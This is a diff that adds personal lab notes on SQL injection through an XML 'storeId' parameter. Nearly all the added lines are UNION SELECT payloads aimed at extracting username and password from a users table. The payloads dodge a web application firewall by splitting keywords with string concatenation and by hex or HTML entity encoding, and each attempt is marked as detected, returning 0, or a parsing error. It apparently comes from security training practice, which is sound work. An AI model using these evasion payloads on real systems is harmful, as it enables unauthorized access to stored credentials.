@@ -59,3 +59,28 @@ Put in math and parameters within XML to see if it works.
 Put in a union to see if it blocks or not or what happends.
 
 
+"UN" + "ION" SELECT NULL    Detected
+"UN" + "ION" "SEL" + "ECT" NULL   Getting a 0 supposofly you can only fetch one column
+
+"UNI" + "ON" "SEL" + "ECT" username from users 0 
+
+<@hex_entities>1 "UNI" + "ON" "SEL" + "ECT" "user" + "name" || '~' || "pass" + "word" FROM users<@/hex_entities> detected
+
+
+<@hex_entities>1 &#x55;NION &#x53;ELECT &#x75;sername || '~' || &#x70;assword &#x46;ROM users<@/hex_entities></storeId>
+
+
+UNION SELECT username || '~' || password FROM users
+| &#x7c;
+' &#39
+
+"UN" + "ION" "SE" + "LECT" username || '~' || password FROM users det
+"UN" + "ION" "SE" + "LECT" username password FROM users  0 
+"UN" + "ION" "SE" + "LECT" username || &#x27;&#x7e;&#x27; || password FROM user 0
+"UN" + "ION" "SE" + "LECT" username &#x7c;&#x7c; '~' &#x7c;&#x7c; password FROM users det
+"UN" + "ION" "SE" + "LECT" username || '&#x7e;' || password FROM users det
+"UN" + "ION" "SE" + "LECT" username from users
+"UN" + "ION" "SE" + "LECT" username || '&#x7e;' || password FROM users
+
+<@hex_entities>1 UNION SELECT username || &#39;~&#39; || password FROM users<@/hex_entities> det 
+<@hex_entities>1 	&#x55NION 	&#x53ELECT username || &#39;~&#39; || password FROM users<@/hex_entities> parsing error
